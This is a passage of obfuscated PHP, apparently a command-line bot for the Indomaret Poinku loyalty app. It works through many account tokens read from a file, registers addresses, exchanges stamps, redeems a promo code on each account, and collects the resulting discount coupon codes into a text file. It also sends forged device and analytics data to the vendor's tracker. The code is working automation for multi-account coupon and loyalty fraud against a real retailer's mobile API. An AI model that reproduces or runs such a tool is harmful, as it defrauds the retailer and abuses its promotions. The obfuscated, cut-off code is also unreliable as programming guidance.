                                                                                $aY0el = $v1ZMX;
                                                                                $sONlZ = str_replace("\r", '', $rERzL);
                                                                                $earOL = $sONlZ;
                                                                                $w5ulg = str_replace("\r", '', $TvVlh);
                                                                                $GOXkU = $w5ulg;
                                                                                $obc_G = str_replace("\r", '', $wlJRC);
                                                                                $mlMLt = $obc_G;
                                                                                echo @zM6ic("nevy", "Akun Ke\t\t: ");
                                                                                echo $jTEU0;
                                                                                $Jk9cx = g8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                                $Ap1KM = json_decode($Jk9cx, true);
                                                                                $M1ADy = @$Ap1KM["data"]["id"];
                                                                                $p4iky = @$Ap1KM["data"]["memberId"];
                                                                                $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                                echo "\n";
                                                                                echo @zm6ic("green", "Nomor HP Anda  : ");
                                                                                echo $BcbF3;
                                                                                echo "\n";
                                                                                $wDisp = "{\"keyword\":\"" . $ip0vw . "\"}";
                                                                                $XTuz1 = g1WXt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address/district", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                $owfHy = json_decode($XTuz1, true);
                                                                                $qtgR3 = "0";
                                                                                $CdOss = "10000000";
                                                                                $qtgR3;
                                                                                rHN94:
                                                                                if (!($qtgR3 < $CdOss)) {
                                                                                    goto dGfMJ;
                                                                                }
                                                                                $L1qpJ = @$owfHy["data"][$qtgR3]["district"];
                                                                                $yJiD4 = @$owfHy["data"][$qtgR3]["districtName"];
                                                                                $JrTpE = @$owfHy["data"][$qtgR3]["city"];
                                                                                $b2ucB = @$owfHy["data"][$qtgR3]["cityName"];
                                                                                $Ipl73 = @$owfHy["data"][$qtgR3]["province"];
                                                                                $K4tCB = @$owfHy["data"][$qtgR3]["provinceName"];
                                                                                $ZqwwP = @$owfHy["data"][$qtgR3]["keyword"];
                                                                                if (!($L1qpJ == '')) {
                                                                                    echo "\n";
                                                                                    echo @ZM6iC("green", "Kota Ke : ");
                                                                                    echo @Zm6ic("red", $qtgR3);
                                                                                    echo "\n";
                                                                                    echo @zM6ic("yellow", "Nama District : ");
                                                                                    echo @Zm6iC("nevy", $yJiD4);
                                                                                    echo "\n";
                                                                                    echo @ZM6Ic("yellow", "Nama Kota\t : ");
                                                                                    echo @zm6Ic("nevy", $b2ucB);
                                                                                    echo "\n";
                                                                                    echo @ZM6iC("yellow", "Nama Provinsi : ");
                                                                                    echo @ZM6ic("nevy", $K4tCB);
                                                                                    echo "\n";
                                                                                    echo @zM6iC("yellow", "Keyword\t   : ");
                                                                                    echo @zM6ic("nevy", $ZqwwP);
                                                                                    echo "\n";
                                                                                    $qtgR3++;
                                                                                    goto rHN94;
                                                                                }
                                                                                dGfMJ:
                                                                                echo "\n";
                                                                                echo @zm6Ic("nevy", "Pilih Kota Mana ? : ");
                                                                                $dQ8Tp = trim(fgets(STDIN));
                                                                                $L1qpJ = @$owfHy["data"][$dQ8Tp]["district"];
                                                                                $yJiD4 = @$owfHy["data"][$dQ8Tp]["districtName"];
                                                                                $JrTpE = @$owfHy["data"][$dQ8Tp]["city"];
                                                                                $b2ucB = @$owfHy["data"][$dQ8Tp]["cityName"];
                                                                                $Ipl73 = @$owfHy["data"][$dQ8Tp]["province"];
                                                                                $K4tCB = @$owfHy["data"][$dQ8Tp]["provinceName"];
                                                                                $ZqwwP = @$owfHy["data"][$dQ8Tp]["keyword"];
                                                                                $wDisp = "{\"city\":" . $JrTpE . ",\"cityName\":\"" . $b2ucB . "\",\"district\":" . $L1qpJ . ",\"districtName\":\"" . $yJiD4 . "\",\"keyword\":\"" . $ZqwwP . "\",\"province\":" . $Ipl73 . ",\"provinceName\":\"" . $K4tCB . "\"}";
                                                                                $XTuz1 = g1Wxt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address/sub-district", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                $owfHy = json_decode($XTuz1, true);
                                                                                $qtgR3 = "0";
                                                                                $CdOss = "10000000";
                                                                                $qtgR3;
                                                                                hc1uy:
                                                                                if (!($qtgR3 < $CdOss)) {
                                                                                    goto PRokP;
                                                                                }
                                                                                $ldzeo = @$owfHy["data"][$qtgR3]["subDistrict"];
                                                                                $U_EVz = @$owfHy["data"][$qtgR3]["subDistrictCode"];
                                                                                $xzAuu = @$owfHy["data"][$qtgR3]["value"];
                                                                                if (!($ldzeo == '')) {
                                                                                    echo "\n";
                                                                                    echo @zM6ic("green", "Kota Ke : ");
                                                                                    echo @zM6ic("red", $qtgR3);
                                                                                    echo "\n";
                                                                                    echo @zm6iC("yellow", "Nama Kelurahan : ");
                                                                                    echo @Zm6ic("nevy", $ldzeo);
                                                                                    echo "\n";
                                                                                    echo @Zm6IC("yellow", "Kode Pos\t   : ");
                                                                                    echo @ZM6Ic("nevy", $U_EVz);
                                                                                    echo "\n";
                                                                                    echo @zm6iC("yellow", "Value\t\t  : ");
                                                                                    echo @ZM6iC("nevy", $xzAuu);
                                                                                    echo "\n";
                                                                                    $qtgR3++;
                                                                                    goto hc1uy;
                                                                                }
                                                                                PRokP:
                                                                                echo @Zm6Ic("nevy", "Pilih Kelurahan Mana ? : ");
                                                                                $dQ8Tp = trim(fgets(STDIN));
                                                                                $ldzeo = @$owfHy["data"][$dQ8Tp]["subDistrict"];
                                                                                $U_EVz = @$owfHy["data"][$dQ8Tp]["subDistrictCode"];
                                                                                $xzAuu = @$owfHy["data"][$dQ8Tp]["value"];
                                                                                $wDisp = "{\"subDistrict\":\"" . $ldzeo . "\",\"subDistrictCode\":\"" . $U_EVz . "\",\"value\":\"" . $xzAuu . "\"}";
                                                                                $XTuz1 = g1WXt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address/postal-code", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                $owfHy = json_decode($XTuz1, true);
                                                                                $Bz8Et = @$owfHy["data"][0]["postalCode"];
                                                                                $pugmZ = @$owfHy["data"][0]["postalCodeId"];
                                                                                echo "\n";
                                                                                echo @zm6iC("green", "Postal Code\t: ");
                                                                                echo @zm6Ic("red", $Bz8Et);
                                                                                echo "\n";
                                                                                echo @Zm6ic("yellow", "Postal Code ID : ");
                                                                                echo @ZM6iC("nevy", $pugmZ);
                                                                                echo "\n";
                                                                                $wDisp = "{\"address\":\"" . $hGkCN . "\",\"addressName\":\"Rumah\",\"district\":{\"city\":" . $JrTpE . ",\"cityName\":\"" . $b2ucB . "\",\"district\":" . $L1qpJ . ",\"districtName\":\"" . $yJiD4 . "\",\"keyword\":\"" . $ZqwwP . "\",\"province\":" . $Ipl73 . ",\"provinceName\":\"" . $K4tCB . "\"},\"id\":0,\"isPrimary\":false,\"postalCode\":{\"postalCode\":\"" . $Bz8Et . "\",\"postalCodeId\":\"" . $pugmZ . "\"},\"recipientEmail\":\"" . $z6UZd . "\",\"recipientName\":\"" . $m_IIo . "\",\"recipientPhoneNumber\":\"" . $qFy6r . "\",\"subDistrict\":{\"subDistrict\":\"" . $ldzeo . "\",\"subDistrictCode\":\"" . $U_EVz . "\",\"value\":\"" . $xzAuu . "\"}}";
                                                                                $XTuz1 = G1WxT("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                $owfHy = json_decode($XTuz1, true);
                                                                                $fZ2bz = @$owfHy["message"];
                                                                                echo "\n";
                                                                                echo @ZM6IC("green", "Status : ");
                                                                                echo @zM6Ic("purple", $fZ2bz);
                                                                                echo "\n";
                                                                                $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address", $aY0el, $GOXkU, $mlMLt);
                                                                                $jTEU0++;
                                                                                goto VouNS;
                                                                            }
                                                                            $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                            $u35jw = count($m0f8X) - 1;
                                                                            $lPULW = $m0f8X;
                                                                            $wZnHP = $lPULW[$jTEU0];
                                                                            echo "\n";
                                                                            $zcN5u = xoZb4(array("|"), $wZnHP)[0];
                                                                            $wlJRC = xOzb4(array("|"), $wZnHP)[1];
                                                                            $U0YgX = str_replace("\r", '', $zcN5u);
                                                                            $zn5zd = $U0YgX;
                                                                            $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                            $aY0el = $v1ZMX;
                                                                            $sONlZ = str_replace("\r", '', $rERzL);
                                                                            $earOL = $sONlZ;
                                                                            $w5ulg = str_replace("\r", '', $TvVlh);
                                                                            $GOXkU = $w5ulg;
                                                                            $obc_G = str_replace("\r", '', $wlJRC);
                                                                            $mlMLt = $obc_G;
                                                                            echo @zM6IC("nevy", "Akun Ke\t\t: ");
                                                                            echo $jTEU0;
                                                                            $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                            $Ap1KM = json_decode($Jk9cx, true);
                                                                            $M1ADy = @$Ap1KM["data"]["id"];
                                                                            $p4iky = @$Ap1KM["data"]["memberId"];
                                                                            $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                            echo "\n";
                                                                            echo @zM6Ic("green", "Nomor HP Anda  : ");
                                                                            echo $BcbF3;
                                                                            echo "\n";
                                                                            $Jk9cx = g8PF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/stamps/me", $aY0el, $GOXkU, $mlMLt);
                                                                            $Ap1KM = json_decode($Jk9cx, true);
                                                                            $v9NcH = @$Ap1KM["data"]["balance"];
                                                                            echo "\n";
                                                                            echo @zM6ic("green", "Balance Stamp  : ");
                                                                            echo $v9NcH;
                                                                            echo "\n";
                                                                            $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"Stamp detail\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                            $m5BZY = GGGR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                            $upOL9 = g8Pf2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/stamps/me/buckets?page=0&size=1000", $aY0el, $GOXkU, $mlMLt);
                                                                            $owfHy = json_decode($upOL9, true);
                                                                            $qtgR3 = "0";
                                                                            $CdOss = "10000000";
                                                                            $qtgR3;
                                                                            v8B4y:
                                                                            if (!($qtgR3 < $CdOss)) {
                                                                                goto jwQwr;
                                                                            }
                                                                            $e0XZt = @$owfHy["data"]["content"][$qtgR3]["id"];
                                                                            $kTI3Y = @$owfHy["data"]["content"][$qtgR3]["name"];
                                                                            $v9NcH = @$owfHy["data"]["content"][$qtgR3]["balance"];
                                                                            $LwPoO = @$owfHy["data"]["content"][$qtgR3]["imageUrl"];
                                                                            if (!($kTI3Y == '')) {
                                                                                echo "\n";
                                                                                echo @zM6ic("green", "Barang Ke\t: ");
                                                                                echo @Zm6iC("red", $qtgR3);
                                                                                echo "\n";
                                                                                echo @zM6ic("yellow", "Nama Stamp   : ");
                                                                                echo @zm6IC("nevy", $kTI3Y);
                                                                                echo "\n";
                                                                                echo @ZM6IC("yellow", "Jumlah Stamp : ");
                                                                                echo @ZM6ic("nevy", $v9NcH);
                                                                                echo "\n";
                                                                                $qtgR3++;
                                                                                goto v8B4y;
                                                                            }
                                                                            jwQwr:
                                                                            echo "\n";
                                                                            echo @Zm6iC("green", "Mau Tukar Produk Mana ? : ");
                                                                            $dQ8Tp = trim(fgets(STDIN));
                                                                            $e0XZt = @$owfHy["data"]["content"][$dQ8Tp]["id"];
                                                                            echo "\n";
                                                                            $upOL9 = G8PF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/stamps/me/buckets/" . $e0XZt . "/promotions?unpaged=true&sort=createdDate,desc", $aY0el, $GOXkU, $mlMLt);
                                                                            $owfHy = json_decode($upOL9, true);
                                                                            $ZXjwY = @$owfHy["data"]["content"][0]["name"];
                                                                            $BW_8H = @$owfHy["data"]["content"][0]["description"];
                                                                            echo "\n";
                                                                            echo @zM6iC("green", "Nama Stamp : ");
                                                                            echo @zM6iC("red", $ZXjwY);
                                                                            echo "\n";
                                                                            echo @zM6ic("yellow", "Deskripsi : ");
                                                                            echo @zm6ic("nevy", $BW_8H);
                                                                            echo "\n";
                                                                            $upOL9 = g8PF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/stamps/me/buckets/" . $e0XZt . "/coupons?unpaged=true&sort=amount,asc&sort=name,asc", $aY0el, $GOXkU, $mlMLt);
                                                                            $owfHy = json_decode($upOL9, true);
                                                                            $fM3_G = "0";
                                                                            $bDQe4 = "10000000";
                                                                            $fM3_G;
                                                                            w5u0B:
                                                                            if (!($fM3_G < $bDQe4)) {
                                                                                goto wB2V7;
                                                                            }
                                                                            $gCIzy = @$owfHy["data"]["content"][$fM3_G]["stampExchangeId"];
                                                                            $Qa1_P = @$owfHy["data"]["content"][$fM3_G]["couponId"];
                                                                            $jT2Pf = @$owfHy["data"]["content"][$fM3_G]["couponMasterId"];
                                                                            $J0Fkh = @$owfHy["data"]["content"][$fM3_G]["quota"];
                                                                            $BW_8H = @$owfHy["data"]["content"][$fM3_G]["description"];
                                                                            $wdxee = @$owfHy["data"]["content"][$fM3_G]["exchangeStartDate"];
                                                                            $Y031U = @$owfHy["data"]["content"][$fM3_G]["exchangeEndDate"];
                                                                            $KMaT7 = @$owfHy["data"]["content"][$fM3_G]["type"];
                                                                            $ZXjwY = @$owfHy["data"]["content"][$fM3_G]["name"];
                                                                            $I2tFV = @$owfHy["data"]["content"][$fM3_G]["amount"];
                                                                            if (!($gCIzy == '')) {
                                                                                echo "\n";
                                                                                echo @Zm6IC("green", "Produk Ke : ");
                                                                                echo @zm6iC("red", $fM3_G);
                                                                                echo "\n";
                                                                                echo @Zm6ic("yellow", "Nama Stamp\t  : ");
                                                                                echo @zM6Ic("nevy", $ZXjwY);
                                                                                echo "\n";
                                                                                echo @ZM6IC("yellow", "Tipe Stamp\t  : ");
                                                                                echo @zM6Ic("nevy", $KMaT7);
                                                                                echo "\n";
                                                                                echo @ZM6ic("yellow", "Mulai Penukaran : ");
                                                                                echo @ZM6Ic("nevy", $wdxee);
                                                                                echo "\n";
                                                                                echo @zM6IC("yellow", "Akhir Penukaran : ");
                                                                                echo @zM6ic("nevy", $Y031U);
                                                                                echo "\n";
                                                                                echo @zM6ic("yellow", "Deskripsi\t   : ");
                                                                                echo @zM6Ic("nevy", $BW_8H);
                                                                                echo "\n";
                                                                                echo @zm6IC("yellow", "Jumlah Quota\t: ");
                                                                                echo @Zm6IC("nevy", $J0Fkh);
                                                                                echo "\n";
                                                                                $fM3_G++;
                                                                                goto w5u0B;
                                                                            }
                                                                            wB2V7:
                                                                            echo @ZM6Ic("green", "Mau Tukar Produk Mana ? : ");
                                                                            $dQ8Tp = trim(fgets(STDIN));
                                                                            echo "\n";
                                                                            $gCIzy = @$owfHy["data"]["content"][$dQ8Tp]["stampExchangeId"];
                                                                            $Qa1_P = @$owfHy["data"]["content"][$dQ8Tp]["couponId"];
                                                                            $jT2Pf = @$owfHy["data"]["content"][$dQ8Tp]["couponMasterId"];
                                                                            $J0Fkh = @$owfHy["data"]["content"][$dQ8Tp]["quota"];
                                                                            $BW_8H = @$owfHy["data"]["content"][$dQ8Tp]["description"];
                                                                            $wdxee = @$owfHy["data"]["content"][$dQ8Tp]["exchangeStartDate"];
                                                                            $Y031U = @$owfHy["data"]["content"][$dQ8Tp]["exchangeEndDate"];
                                                                            $KMaT7 = @$owfHy["data"]["content"][$dQ8Tp]["type"];
                                                                            $ZXjwY = @$owfHy["data"]["content"][$dQ8Tp]["name"];
                                                                            $I2tFV = @$owfHy["data"]["content"][$dQ8Tp]["amount"];
                                                                            if ($KMaT7 == "DELIVERY") {
                                                                                $Jk9cx = g8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address", $aY0el, $GOXkU, $mlMLt);
                                                                                $owfHy = json_decode($Jk9cx, true);
                                                                                $YUfPv = @$owfHy["data"][0]["address"];
                                                                                $JrTpE = @$owfHy["data"][0]["district"]["city"];
                                                                                $b2ucB = @$owfHy["data"][0]["district"]["cityName"];
                                                                                $L1qpJ = @$owfHy["data"][0]["district"]["district"];
                                                                                $yJiD4 = @$owfHy["data"][0]["district"]["districtName"];
                                                                                $ZqwwP = @$owfHy["data"][0]["district"]["keyword"];
                                                                                $Ipl73 = @$owfHy["data"][0]["district"]["province"];
                                                                                $D18xv = @$owfHy["data"][0]["id"];
                                                                                $Bz8Et = @$owfHy["data"][0]["postalCode"]["postalCode"];
                                                                                $pugmZ = @$owfHy["data"][0]["postalCode"]["postalCodeId"];
                                                                                $SD3v6 = @$owfHy["data"][0]["recipientEmail"];
                                                                                $CeRgl = @$owfHy["data"][0]["recipientName"];
                                                                                $t2tnx = @$owfHy["data"][0]["recipientPhoneNumber"];
                                                                                $ldzeo = @$owfHy["data"][0]["subDistrict"]["subDistrict"];
                                                                                $U_EVz = @$owfHy["data"][0]["subDistrict"]["subDistrictCode"];
                                                                                $xzAuu = @$owfHy["data"][0]["subDistrict"]["value"];
                                                                                $wDisp = "{\"couponId\":\"" . $Qa1_P . "\",\"qty\":1.0,\"stampExchangeId\":\"" . $gCIzy . "\",\"deliveryAddressItem\":{\"address\":\"" . $YUfPv . "\",\"addressName\":\"" . $YUfPv . "\",\"district\":{\"city\":" . $JrTpE . ",\"cityName\":\"" . $b2ucB . "\",\"district\":" . $L1qpJ . ",\"districtName\":\"" . $yJiD4 . "\",\"keyword\":\"" . $ZqwwP . "\",\"province\":" . $Ipl73 . ",\"provinceName\":\"" . $K4tCB . "\"},\"id\":" . $D18xv . ",\"isPrimary\":true,\"postalCode\":{\"postalCode\":\"" . $Bz8Et . "\",\"postalCodeId\":\"" . $pugmZ . "\"},\"recipientEmail\":\"" . $SD3v6 . "\",\"recipientName\":\"" . $CeRgl . "\",\"recipientPhoneNumber\":\"" . $t2tnx . "\",\"subDistrict\":{\"subDistrict\":\"" . $ldzeo . "\",\"subDistrictCode\":\"" . $U_EVz . "\",\"value\":\"" . $xzAuu . "\"}}}";
                                                                                $XTuz1 = G1WXt("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/stamps/me/coupons/exchange", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                $owfHy = json_decode($XTuz1, true);
                                                                                $fZ2bz = @$owfHy["message"];
                                                                                echo @ZM6ic("yellow", "Status : ");
                                                                                echo @zM6Ic("nevy", $fZ2bz);
                                                                                echo "\n";
                                                                                goto UQ9UB;
                                                                            }
                                                                            $wDisp = "{\"couponId\":\"" . $Qa1_P . "\",\"qty\":1.0,\"stampExchangeId\":\"" . $gCIzy . "\"}";
                                                                            $XTuz1 = G1WXt("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/stamps/me/coupons/exchange", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                            $owfHy = json_decode($XTuz1, true);
                                                                            $fZ2bz = @$owfHy["message"];
                                                                            echo @zM6ic("yellow", "Status : ");
                                                                            echo @Zm6ic("nevy", $fZ2bz);
                                                                            echo "\n";
                                                                            UQ9UB:
                                                                            $jTEU0++;
                                                                            goto PcWWE;
                                                                        }
                                                                        $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                        $u35jw = count($m0f8X) - 1;
                                                                        $lPULW = $m0f8X;
                                                                        $wZnHP = $lPULW[$jTEU0];
                                                                        echo "\n";
                                                                        $zcN5u = XOzb4(array("|"), $wZnHP)[0];
                                                                        $wlJRC = XOZB4(array("|"), $wZnHP)[1];
                                                                        $U0YgX = str_replace("\r", '', $zcN5u);
                                                                        $zn5zd = $U0YgX;
                                                                        $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                        $aY0el = $v1ZMX;
                                                                        $sONlZ = str_replace("\r", '', $rERzL);
                                                                        $earOL = $sONlZ;
                                                                        $w5ulg = str_replace("\r", '', $TvVlh);
                                                                        $GOXkU = $w5ulg;
                                                                        $obc_G = str_replace("\r", '', $wlJRC);
                                                                        $mlMLt = $obc_G;
                                                                        echo @ZM6IC("nevy", "Akun Ke\t\t: ");
                                                                        echo $jTEU0;
                                                                        $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                        $Ap1KM = json_decode($Jk9cx, true);
                                                                        $M1ADy = @$Ap1KM["data"]["id"];
                                                                        $p4iky = @$Ap1KM["data"]["memberId"];
                                                                        $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                        echo "\n";
                                                                        echo @zm6IC("green", "Nomor HP Anda  : ");
                                                                        echo $BcbF3;
                                                                        echo "\n";
                                                                        if (file_exists('kodevoc.txt')) {
                                                                            $kodekode = file_get_contents("kodevoc.txt");
                                                                            echo "{$kodekode}\n";
                                                                            goto drear;
                                                                        }
                                                                        echo "Masukkan Kode :";
                                                                        $kodekode = trim(fgets(STDIN));
                                                                        drear:
                                                                        $wDisp = '{"couponPromoCode":"$kodekode"}';
                                                                        $XTuz1 = G1WxT("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/gift/redeem", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                        $C46m0 = json_decode($XTuz1, true);
                                                                        print_r($XTuz1);
                                                                        $ABmxY = @$C46m0["message"];
                                                                        $tJqX7 = @$C46m0["data"]["content"][0]["couponName"];
                                                                        echo @Zm6IC("yellow", "Pesan  : ");
                                                                        echo @zM6iC("nevy", $ABmxY);
                                                                        echo "\n";
                                                                        echo @zM6IC("yellow", "Status : ");
                                                                        echo @zm6IC("nevy", $tJqX7);
                                                                        echo "\n";
                                                                        echo "\n";
                                                                        sleep(3);
                                                                        $UHj7C = G8Pf2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                                                        $lImQC = json_decode($UHj7C, true);
                                                                        $basER = @$lImQC["data"]["content"][0]["status"];
                                                                        $lbuGr = @$lImQC["data"]["content"][0]["couponCode"];
                                                                        $VW123 = @$lImQC["data"]["content"][0]["couponName"];
                                                                        $KTLep = @$lImQC["data"]["content"][1]["couponCode"];
                                                                        $odYyL = @$lImQC["data"]["content"][1]["couponName"];
                                                                        $knJzU = @$lImQC["data"]["content"][2]["couponCode"];
                                                                        $pew2b = @$lImQC["data"]["content"][2]["couponName"];
                                                                        $PEd4h = @$lImQC["data"]["content"][3]["couponCode"];
                                                                        $eAEyy = @$lImQC["data"]["content"][3]["couponName"];
                                                                        $Uzp_O = @$lImQC["data"]["content"][4]["couponCode"];
                                                                        $BeKks = @$lImQC["data"]["content"][4]["couponName"];
                                                                        $QFiev = @$lImQC["data"]["content"][5]["couponCode"];
                                                                        $NFC6_ = @$lImQC["data"]["content"][5]["couponName"];
                                                                        $kbWoT = @$lImQC["data"]["content"][6]["couponName"];
                                                                        $WvHe1 = @$lImQC["data"]["content"][6]["couponCode"];
                                                                        $z4sxX = @$lImQC["data"]["content"][7]["couponName"];
                                                                        $raN1z = @$lImQC["data"]["content"][7]["couponCode"];
                                                                        $kkTa0 = @$lImQC["data"]["content"][8]["couponName"];
                                                                        $zV17j = @$lImQC["data"]["content"][8]["couponCode"];
                                                                        $J2jGQ = @$lImQC["data"]["content"][9]["couponName"];
                                                                        $L9Nzh = @$lImQC["data"]["content"][9]["couponCode"];
                                                                        $mF_0D = @$lImQC["data"]["content"][10]["couponName"];
                                                                        $GTMYQ = @$lImQC["data"]["content"][10]["couponCode"];
                                                                        $LNAso = @$lImQC["data"]["content"][11]["couponName"];
                                                                        $f2A4u = @$lImQC["data"]["content"][11]["couponCode"];
                                                                        $t4wQX = @$lImQC["data"]["content"][12]["couponName"];
                                                                        $Q6vWf = @$lImQC["data"]["content"][12]["couponCode"];
                                                                        $S02nx = @$lImQC["data"]["content"][13]["couponName"];
                                                                        $Q8u1Y = @$lImQC["data"]["content"][13]["couponCode"];
                                                                        $ucJzj = @$lImQC["data"]["content"][14]["couponName"];
                                                                        $Ex3sI = @$lImQC["data"]["content"][14]["couponCode"];
                                                                        $PKr5B = @$lImQC["data"]["content"][15]["couponName"];
                                                                        $kGhP3 = @$lImQC["data"]["content"][15]["couponCode"];
                                                                        $uU2QF = @$lImQC["data"]["content"][16]["couponName"];
                                                                        $e52KH = @$lImQC["data"]["content"][16]["couponCode"];
                                                                        $ipfVm = @$lImQC["data"]["content"][17]["couponName"];
                                                                        $gwQ0n = @$lImQC["data"]["content"][17]["couponCode"];
                                                                        if ($VW123 == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rHriJ("Kupon Poinku new.txt", $lbuGr);
                                                                            goto V_8q5;
                                                                        }
                                                                        if ($odYyL == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rhRiJ("Kupon Poinku new.txt", $KTLep);
                                                                            goto we6J2;
                                                                        }
                                                                        if ($pew2b == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RHRij("Kupon Poinku new.txt", $knJzU);
                                                                            goto LYQTx;
                                                                        }
                                                                        if ($eAEyy == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rhRij("Kupon Poinku new.txt", $PEd4h);
                                                                            goto y0e5f;
                                                                        }
                                                                        if ($BeKks == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RHRij("Kupon Poinku new.txt", $Uzp_O);
                                                                            goto BQUXh;
                                                                        }
                                                                        if ($NFC6_ == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RhrIJ("Kupon Poinku new.txt", $QFiev);
                                                                            goto C81Xy;
                                                                        }
                                                                        if ($kbWoT == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rhrij("Kupon Poinku new.txt", $WvHe1);
                                                                            goto NrQ94;
                                                                        }
                                                                        if ($z4sxX == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RhriJ("Kupon Poinku new.txt", $raN1z);
                                                                            goto BBtBz;
                                                                        }
                                                                        if ($kkTa0 == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            Rhrij("Kupon Poinku new.txt", $zV17j);
                                                                            goto Zv9qP;
                                                                        }
                                                                        if ($J2jGQ == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rHrIJ("Kupon Poinku new.txt", $L9Nzh);
                                                                            goto MVc4v;
                                                                        }
                                                                        if ($mF_0D == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RHrij("Kupon Poinku new.txt", $GTMYQ);
                                                                            goto kvyId;
                                                                        }
                                                                        if ($LNAso == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rhRIJ("Kupon Poinku new.txt", $f2A4u);
                                                                            goto q9l5G;
                                                                        }
                                                                        if ($t4wQX == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            rHriJ("Kupon Poinku new.txt", $Q6vWf);
                                                                            goto QFItA;
                                                                        }
                                                                        if ($S02nx == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RhRij("Kupon Poinku new.txt", $Q8u1Y);
                                                                            goto NXRyP;
                                                                        }
                                                                        if ($ucJzj == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RhrIj("Kupon Poinku new.txt", $Ex3sI);
                                                                            goto MNFa0;
                                                                        }
                                                                        if ($PKr5B == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RHRij("Kupon Poinku new.txt", $kGhP3);
                                                                            goto iOMaV;
                                                                        }
                                                                        if ($uU2QF == "Diskon Rp 25.000 Klik Indomaret") {
                                                                            RHRIj("Kupon Poinku new.txt", $e52KH);
                                                                            goto iT6C0;
                                                                        }
                                                                        if (!($ipfVm == "Diskon Rp 25.000 Klik Indomaret")) {
                                                                            goto se_Kh;
                                                                        }
                                                                        rhRij("Kupon Poinku new.txt", $gwQ0n);
                                                                        se_Kh:
                                                                        iT6C0:
                                                                        iOMaV:
                                                                        MNFa0:
                                                                        NXRyP:
                                                                        QFItA:
                                                                        q9l5G:
                                                                        kvyId:
                                                                        MVc4v:
                                                                        Zv9qP:
                                                                        BBtBz:
                                                                        NrQ94:
                                                                        C81Xy:
                                                                        BQUXh:
                                                                        y0e5f:
                                                                        LYQTx:
                                                                        we6J2:
                                                                        V_8q5:
                                                                        echo "\n";
                                                                        echo @zm6Ic("yellow", "[1] {$odYyL} \n\t> {$KTLep} \n\n");
                                                                        echo @ZM6IC("green", "[2] {$pew2b} \n\t> {$knJzU} \n\n");
                                                                        echo @zM6Ic("nevy", "[3] {$eAEyy} \n\t> {$PEd4h} \n\n");
                                                                        echo @zm6iC("red", "[4] {$BeKks} \n\t> {$Uzp_O} \n\n");
                                                                        echo @ZM6iC("blue", "[5] {$NFC6_} \n\t > {$QFiev} \n\n");
                                                                        echo @ZM6ic("nevy", "[6] {$kbWoT} \n\t> {$WvHe1} \n\n");
                                                                        echo @ZM6ic("purple", "[7] {$VW123} \n\t> {$lbuGr} \n\n");
                                                                        echo @Zm6Ic("green", "[8] {$z4sxX} \n\t> {$raN1z} \n\n");
                                                                        echo @Zm6IC("yellow", "[9] {$kkTa0} \n\t> {$zV17j} \n\n");
